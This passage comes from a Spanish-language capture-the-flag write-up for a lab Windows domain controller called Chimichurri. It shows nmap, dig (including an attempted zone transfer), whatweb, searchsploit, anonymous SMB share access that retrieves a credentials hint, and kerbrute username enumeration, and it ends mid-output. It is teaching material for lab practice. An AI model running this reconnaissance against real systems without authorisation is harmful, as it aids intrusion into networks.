+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>6969/tcp  open  http          Jetty 10.0.11
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-title: Panel de control <span style="color:#f92672">[</span>Jenkins<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Jetty<span style="color:#f92672">(</span>10.0.11<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry 
+</span></span><span style="display:flex;"><span>|_/
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49665/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49670/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49672/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49675/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49694/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>65137/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: Host: CHIMICHURRI; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2025-01-23T18:27:28
+</span></span><span style="display:flex;"><span>|_  start_date: 2025-01-23T12:29:02
+</span></span><span style="display:flex;"><span>|_clock-skew: -1h09m54s
+</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: CHIMICHURRI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 70.45 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Muy bien, me da curiosidad el <strong>puerto 6969</strong> porque al parecer está activo un <strong>servidor Jenkins</strong>. Además, obtuvimos el dominio del <strong>AD</strong>, por lo que podemos registrarlo en el <code>/etc/hosts</code>.</p>
+<p>Vamos a comenzar a analizar los servicios en el siguiente orden: <strong>DNS, Jenkins, SMB, Kerberos</strong>.</p>
+<p>Veamos qué podemos encontrar.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="DNS">Analizando Servicio DNS</h3>
+<p>Veamos qué información podemos obtener con la herramienta <strong>dig</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig @192.168.1.50 chimichurri.thl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; &lt;&lt;&gt;&gt; DiG 9.20.4-3-Debian &lt;&lt;&gt;&gt; @192.168.1.50 chimichurri.thl
+</span></span><span style="display:flex;"><span>; <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> server found<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; global options: +cmd
+</span></span><span style="display:flex;"><span>;; Got answer:
+</span></span><span style="display:flex;"><span>;; -&gt;&gt;HEADER<span style="color:#e6db74">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span style="color:#ae81ff">1794</span>
+</span></span><span style="display:flex;"><span>;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>;; OPT PSEUDOSECTION:
+</span></span><span style="display:flex;"><span>; EDNS: version: 0, flags:; udp: <span style="color:#ae81ff">4000</span>
+</span></span><span style="display:flex;"><span>; COOKIE: 6080212094defe76e6 <span style="color:#f92672">(</span>echoed<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; QUESTION SECTION:
+</span></span><span style="display:flex;"><span>;chimichurri.thl.               IN      A
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>;; ANSWER SECTION:
+</span></span><span style="display:flex;"><span>chimichurri.thl.        <span style="color:#ae81ff">600</span>     IN      A       192.168.1.50
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>;; Query time: <span style="color:#ae81ff">4</span> msec
+</span></span><span style="display:flex;"><span>;; SERVER: 192.168.1.50#53<span style="color:#f92672">(</span>192.168.1.50<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>UDP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; WHEN: Thu Jan <span style="color:#ae81ff">23</span> 15:41:56 CST <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>;; MSG SIZE  rcvd: <span style="color:#ae81ff">72</span>
+</span></span></code></pre></div><p>Excelente, nos responde.</p>
+<p>Veamos si hay algún correo registrado:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig @192.168.1.50 chimichurri.thl mx
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; &lt;&lt;&gt;&gt; DiG 9.20.4-3-Debian &lt;&lt;&gt;&gt; @192.168.1.50 chimichurri.thl mx
+</span></span><span style="display:flex;"><span>; <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> server found<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; global options: +cmd
+</span></span><span style="display:flex;"><span>;; Got answer:
+</span></span><span style="display:flex;"><span>;; -&gt;&gt;HEADER<span style="color:#e6db74">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span style="color:#ae81ff">59507</span>
+</span></span><span style="display:flex;"><span>;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>;; OPT PSEUDOSECTION:
+</span></span><span style="display:flex;"><span>; EDNS: version: 0, flags:; udp: <span style="color:#ae81ff">4000</span>
+</span></span><span style="display:flex;"><span>; COOKIE: 0d83okee93fe25fcf <span style="color:#f92672">(</span>echoed<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; QUESTION SECTION:
+</span></span><span style="display:flex;"><span>;chimichurri.thl.               IN      MX
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>;; AUTHORITY SECTION:
+</span></span><span style="display:flex;"><span>chimichurri.thl.        <span style="color:#ae81ff">3600</span>    IN      SOA     chimichurri.chimichurri.thl. hostmaster.chimichurri.thl. <span style="color:#ae81ff">45</span> <span style="color:#ae81ff">900</span> <span style="color:#ae81ff">600</span> <span style="color:#ae81ff">86400</span> <span style="color:#ae81ff">3600</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>;; Query time: <span style="color:#ae81ff">3</span> msec
+</span></span><span style="display:flex;"><span>;; SERVER: 192.168.1.50#53<span style="color:#f92672">(</span>192.168.1.50<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>UDP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; WHEN: Thu Jan <span style="color:#ae81ff">23</span> 15:42:37 CST <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>;; MSG SIZE  rcvd: <span style="color:#ae81ff">115</span>
+</span></span></code></pre></div><p>No hay ninguno.</p>
+<p>Veamos si hay algún otro servidor registrado:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig @192.168.1.50 chimichurri.thl ns
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; &lt;&lt;&gt;&gt; DiG 9.20.4-3-Debian &lt;&lt;&gt;&gt; @192.168.1.50 chimichurri.thl ns
+</span></span><span style="display:flex;"><span>; <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> server found<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; global options: +cmd
+</span></span><span style="display:flex;"><span>;; Got answer:
+</span></span><span style="display:flex;"><span>;; -&gt;&gt;HEADER<span style="color:#e6db74">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span style="color:#ae81ff">57564</span>
+</span></span><span style="display:flex;"><span>;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>;; OPT PSEUDOSECTION:
+</span></span><span style="display:flex;"><span>; EDNS: version: 0, flags:; udp: <span style="color:#ae81ff">4000</span>
+</span></span><span style="display:flex;"><span>; COOKIE: 693ei93jd87dccdfe <span style="color:#f92672">(</span>echoed<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; QUESTION SECTION:
+</span></span><span style="display:flex;"><span>;chimichurri.thl.               IN      NS
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>;; ANSWER SECTION:
+</span></span><span style="display:flex;"><span>chimichurri.thl.        <span style="color:#ae81ff">3600</span>    IN      NS      chimichurri.chimichurri.thl.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>;; ADDITIONAL SECTION:
+</span></span><span style="display:flex;"><span>chimichurri.chimichurri.thl. <span style="color:#ae81ff">3600</span> IN    A       192.168.1.50
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>;; Query time: <span style="color:#ae81ff">3</span> msec
+</span></span><span style="display:flex;"><span>;; SERVER: 192.168.1.50#53<span style="color:#f92672">(</span>192.168.1.50<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>UDP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; WHEN: Thu Jan <span style="color:#ae81ff">23</span> 15:42:53 CST <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>;; MSG SIZE  rcvd: <span style="color:#ae81ff">98</span>
+</span></span></code></pre></div><p>No aparece ninguno.</p>
+<p>Por último, vamos a tratar de aplicar un <strong>ataque de transferencia de zona</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig @192.168.1.50 chimichurri.thl axfr
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; &lt;&lt;&gt;&gt; DiG 9.20.4-3-Debian &lt;&lt;&gt;&gt; @192.168.1.50 chimichurri.thl axfr
+</span></span><span style="display:flex;"><span>; <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> server found<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; global options: +cmd
+</span></span><span style="display:flex;"><span>; Transfer failed.
+</span></span></code></pre></div><p>Fallo, no podemos obtener más información.</p>
+<h3 id="Jenkins">Analizando Servidor Jenkins</h3>
+<p>Vamos a tratar de entrar al <strong>servidor Jenkins</strong> y veamos qué obtenemos.</p>
+<p>Recuerda especificar el puerto:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-chimichurri/Captura1.png">
+</p>
+<p>Pudimos entrar.</p>
+<p>Veamos qué nos dice <strong>Wappalizer</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-chimichurri/Captura2.png">
+</p>
+<p>Mmmm no veo algo que nos ayude del todo.</p>
+<p>Quizá con la herramienta <strong>whatweb</strong>, podemos encontrar algo más:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whatweb http://192.168.1.50:6969
+</span></span><span style="display:flex;"><span>http://192.168.1.50:6969 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Cookies<span style="color:#f92672">[</span>JSESSIONID.1axasjn3<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Jetty<span style="color:#f92672">(</span>10.0.11<span style="color:#f92672">)]</span>, HttpOnly<span style="color:#f92672">[</span>JSESSIONID.1aec7c13<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>192.168.1.50<span style="color:#f92672">]</span>, Jenkins<span style="color:#f92672">[</span>2.361.4<span style="color:#f92672">]</span>, Jetty<span style="color:#f92672">[</span>10.0.11<span style="color:#f92672">]</span>, OpenSearch<span style="color:#f92672">[</span>/opensearch.xml<span style="color:#f92672">]</span>, Prototype, Script<span style="color:#f92672">[</span>text/javascript<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span>Panel de control <span style="color:#f92672">[</span>Jenkins<span style="color:#f92672">]]</span>, UncommonHeaders<span style="color:#f92672">[</span>x-content-type-options,x-hudson-theme,referrer-policy,cross-origin-opener-policy,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity<span style="color:#f92672">]</span>, X-Frame-Options<span style="color:#f92672">[</span>sameorigin<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Genial, tenemos la versión de <strong>Jenkins</strong> que están usando, que es la <strong>versión 2.361.4</strong>.</p>
+<p>Parece que hay un usuario registrado que se llama <strong>Perro</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-chimichurri/Captura3.png">
+</p>
+<p>Pero no muestra nada más que su nombre, guardémoslo por si acaso.</p>
+<p>Tenemos acceso a un login, pero aún no tenemos credenciales válidas que podamos usar:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-chimichurri/Captura4.png">
+</p>
+<p>Creo que por ahora no podemos hacer más.</p>
+<p>Aunque, como ya tenemos una versión del servicio, podemos buscar un Exploit.</p>
+<p>Veamos si hay algo registrado en Kali, usando la herramienta <strong>searchsploit</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit jenkins 2.361.4
+</span></span><span style="display:flex;"><span>Exploits: No Results
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span></code></pre></div><p>Nada en específico, pero es posible que exista un Exploit de una versión superior o anterior que pueda ser usado contra esta versión.</p>
+<p>Busquemos <strong>Jenkins</strong> en general:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>searchsploit jenkins
+</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                                                                                                                                 |  Path
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|---|---|
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Jenkins 2.235.3 - <span style="color:#e6db74">&#39;Description&#39;</span> Stored XSS                                                                                                                                     | java/webapps/49237.txt
+</span></span><span style="display:flex;"><span>Jenkins 2.235.3 - <span style="color:#e6db74">&#39;tooltip&#39;</span> Stored Cross-Site Scripting                                                                                                                        | java/webapps/49232.txt
+</span></span><span style="display:flex;"><span>Jenkins 2.235.3 - <span style="color:#e6db74">&#39;X-Forwarded-For&#39;</span> Stored XSS                                                                                                                                 | java/webapps/49244.txt
+</span></span><span style="display:flex;"><span>Jenkins 2.441 - Local File Inclusion                                                                                                                                           | java/webapps/51993.py
+</span></span><span style="display:flex;"><span>Jenkins 2.63 - Sandbox bypass in pipeline: Groovy plug-in                                                                                                                      | java/webapps/48904.txt
+</span></span><span style="display:flex;"><span>Jenkins &lt; 1.650 - Java Deserialization
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Me llama la atención el Exploit que aplica un <strong>LFI</strong>, pero aún no vamos a usarlo.</p>
+<p>Sigamos investigando otros servicios.</p>
+<h3 id="SMB">Enumeración de Servicio SMB</h3>
+<p>Obtengamos información del <strong>servicio SMB</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.1.50
+</span></span><span style="display:flex;"><span>SMB         192.168.1.50   <span style="color:#ae81ff">445</span>    CHIMICHURRI      <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2016</span> Build <span style="color:#ae81ff">14393</span> x64 <span style="color:#f92672">(</span>name:CHIMICHURRI<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:chimichurri.thl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Parece que vamos a necesitar un usuario válido para poder ver los archivos compartidos.</p>
+<p>Veamos si podemos listarlos con <strong>smbclient</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient -L //192.168.1.50// -N
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>        ---------       ----      -------
+</span></span><span style="display:flex;"><span>        ADMIN$          Disk      Admin remota
+</span></span><span style="display:flex;"><span>        C$              Disk      Recurso predeterminado
+</span></span><span style="display:flex;"><span>        drogas          Disk      
+</span></span><span style="display:flex;"><span>        IPC$            IPC       IPC remota
+</span></span><span style="display:flex;"><span>        NETLOGON        Disk      Recurso compartido del servidor de inicio de sesión 
+</span></span><span style="display:flex;"><span>        SYSVOL          Disk      Recurso compartido del servidor de inicio de sesión 
+</span></span><span style="display:flex;"><span>Reconnecting with SMB1 <span style="color:#66d9ef">for</span> workgroup listing.
+</span></span><span style="display:flex;"><span>do_connect: Connection to 192.168.1.50 failed <span style="color:#f92672">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Unable to connect with SMB1 -- no workgroup available
+</span></span></code></pre></div><p>Excelente, podemos verlos y parece que hay un recurso al que podemos conectarnos.</p>
+<p>Tratemos de entrar directamente en ese recurso llamado <strong>drogas</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient //192.168.1.50/drogas -N
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span>
+</span></span></code></pre></div><p>Estamos dentro.</p>
+<p>Veamos qué recursos hay dentro:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> dir
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Thu Jun <span style="color:#ae81ff">27</span> 04:20:49 <span style="color:#ae81ff">2024</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Jun <span style="color:#ae81ff">27</span> 04:20:49 <span style="color:#ae81ff">2024</span>
+</span></span><span style="display:flex;"><span>  credenciales.txt                    A       <span style="color:#ae81ff">95</span>  Sun Jun <span style="color:#ae81ff">30</span> 11:19:03 <span style="color:#ae81ff">2024</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">7735807</span> blocks of size 4096. <span style="color:#ae81ff">4297969</span> blocks available
+</span></span></code></pre></div><p>Parece que tenemos unas credenciales.</p>
+<p>Vamos a descargar ese archivo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> get credenciales.txt
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\c</span>redenciales.txt of size <span style="color:#ae81ff">95</span> as credenciales.txt <span style="color:#f92672">(</span>23.2 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 23.2 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Y veamos su contenido:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat credenciales.txt
+</span></span><span style="display:flex;"><span>Todo es mejor en con el usuario hacker, en su escritorio estan sus claves de acceso como perico
+</span></span></code></pre></div><p>Muy bien, tenemos otro usuario y nos están dando una pista de dónde buscar su contraseña.</p>
+<h3 id="Kerberos">Enumeración de Servicio Kerberos</h3>
+<p>Ahora ya tenemos un par de usuarios y podemos comprobar si este existe dentro del <strong>servicio Kerberos</strong> usando la herramienta <strong>kerbrute</strong>.</p>
+<p>Vamos a meterlos dentro de un archivo de texto:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nano users.txt
+</span></span><span style="display:flex;"><span>--------------
+</span></span><span style="display:flex;"><span>Perro
+</span></span><span style="display:flex;"><span>perro
+</span></span><span style="display:flex;"><span>hacker
+</span></span></code></pre></div><p>Y usaremos el <strong>modo userenum</strong> de la herramienta <strong>kerbrute</strong> para comprobar que existen dentro de la máquina:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./kerbrute_linux_amd64 userenum -d chimichurri.thl --dc 192.168.1.50 users.txt
+</span></span><span style="display:flex;"><span>    __             __               __     
+</span></span><span style="display:flex;"><span>   / /_____  _____/ /_  _______  __/ /____ 
+</span></span><span style="display:flex;"><span>  / //_/ _ <span style="color:#ae81ff">\/</span> ___/ __ <span style="color:#ae81ff">\/</span> ___/ / / / __/ _ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span></span><span style="display:flex;"><span>/_/|_|<span style="color:#ae81ff">\_</span>__/_/  /_.___/_/   <span style="color:#ae81ff">\_</span>_,_/<span style="color:#ae81ff">\_</span>_/<span style="color:#ae81ff">\_</span>__/                                        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Version: v1.0.3 <span style="color:#f92672">(</span>9dad6e1<span style="color:#f92672">)</span> - 01/23/25 - Ronnie Flathers @ropnop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2025/01/23 18:04:56 &gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>2025/01/23 18:04:56 &gt;   192.168.1.50:88
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2025/01/23 18:04:56 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       hacker@chimichurri.thl
+</span></span><span style="display:flex;"><span>2025/01/23 18:04:56 &gt;  Done! Tested <span style="color:#ae81ff">3</span> usernames <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> valid<span style="color:#f92672">)</span> in 0.023 seconds
+</span></span></code></pre></div><p>Bien, el <strong>usuario hacker</strong> sí existe.</p>
+<p>Por último, vamos a probar si existen más usuarios usando un wordlist de <strong>seclist</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./kerbrute_linux_amd64 userenum -d chimichurri.thl --dc 192.168.1.50 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+</span></span><span style="display:flex;"><span>    __             __               __     
+</span></span><span style="display:flex;"><span>   / /_____  _____/ /_  _______  __/ /____ 
+</span></span><span style="display:flex;"><span>  / //_/ _ <span style="color:#ae81ff">\/</span> ___/ __ <span style="color:#ae81ff">\/</span> ___/ / / / __/ _ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span></span><span style="display:flex;"><span>/_/|_|<span style="color:#ae81ff">\_</span>__/_/  /_.___/_/   <span style="color:#ae81ff">\_</span>_,_/<span style="color:#ae81ff">\_</span>_/<span style="color:#ae81ff">\_</span>__/                                        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Version: v1.0.3 <span style="color:#f92672">(</span>9dad6e1<span style="color:#f92672">)</span> - 01/23/25 - Ronnie Flathers @ropnop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2025/01/23 17:40:06 &gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>2025/01/23 17:40:06 &gt;   192.168.1.50:88
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2025/01/23 17:40:10 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       hacker@chimichurri.thl
+</span></span><span style="display:flex;"><span>2025/01/23 17:40:25 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       Hacker@chimichurri.thl
+</span></span><span style="display:flex;"><span>2025/01/23 17:42:10 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       invitado@chimichurri.thl
+</span></span><span style="display:flex;"><span>2025/01/23 17:47:32 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       administrador@chimichurri.thl
+</span></span><span style="display:flex;"><span>2025/01/23 17:48:01 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:       HACKER@chimichurri.thl
